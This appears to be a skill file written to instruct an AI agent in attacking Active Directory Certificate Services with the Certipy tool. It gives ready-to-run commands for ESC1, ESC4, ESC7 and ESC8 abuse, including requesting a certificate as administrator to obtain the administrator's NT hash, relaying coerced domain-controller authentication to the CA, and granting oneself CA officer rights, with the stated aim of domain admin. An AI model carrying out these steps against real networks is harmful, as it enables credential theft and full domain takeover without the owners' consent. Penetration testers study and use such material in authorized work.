---
name: adcs-certipy-attack
description: "ADCS attacks with Certipy: ESC1-ESC8 misconfigurations, certificate template abuse, and obtaining domain admin via certificate services. Use this skill when the domain runs Active Directory Certificate Services."
---

# ADCS / Certipy

## Overview

ADCS issues certificates that authenticate as a user. Template misconfigurations let a low-privileged user request a certificate for a privileged account.

## Enumerate

```bash
certipy find -u user@domain.local -p pass -dc-ip DC -vulnerable -stdout
```

## ESC classes

| ESC | Misconfiguration | Abuse |
|---|---|---|
| ESC1 | template allows requester-supplied SAN + Client Auth | request a cert as administrator |
| ESC2 | template allows Any Purpose | use for auth |
| ESC3 | enrollment agent template | request on behalf of another user |
| ESC4 | writable template ACL | modify the template then ESC1 |
| ESC5 | writable PKI object | modify CA config |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA | SAN in any request |
| ESC7 | CA officer rights | approve your own request |
| ESC8 | HTTP enrollment endpoint | NTLM relay to the CA |

## ESC1 exploitation

```bash
certipy req -u user@domain.local -p pass -ca CA-NAME -template VULN_TEMPLATE \
  -upn administrator@domain.local -dc-ip DC
certipy auth -pfx administrator.pfx -dc-ip DC
```

The second command returns the administrator's NT hash.

## ESC8 (relay)

```bash
certipy relay -ca CA-NAME -template DomainController
# then coerce a DC to authenticate
python3 printerbug.py domain.local/user:pass@DC CA_HOST
```

## ESC4

```bash
certipy template -u user@domain.local -p pass -template VULN -save-old
# modify, exploit as ESC1, then restore
certipy template -u user@domain.local -p pass -template VULN -restore
```

## ESC7

```bash
certipy ca -u user@domain.local -p pass -ca CA-NAME -add-officer user
certipy req -u user@domain.local -p pass -ca CA-NAME -template SubCA -upn administrator@domain.local
certipy ca -u user@domain.local -p pass -ca CA-NAME -issue-request <id>
certipy req -u user@domain.local -p pass -ca CA-NAME -retrieve <id>
```

## Pitfalls

- Certificate-based auth needs the DC to allow PKINIT; check with `certipy auth -pfx`.
- Revoked certificates fail; timing matters.
- ESC8 requires the CA's HTTP endpoint to be reachable and NTLM auth enabled.

## Verification

The certificate must authenticate as the target principal and return a usable hash or TGT.
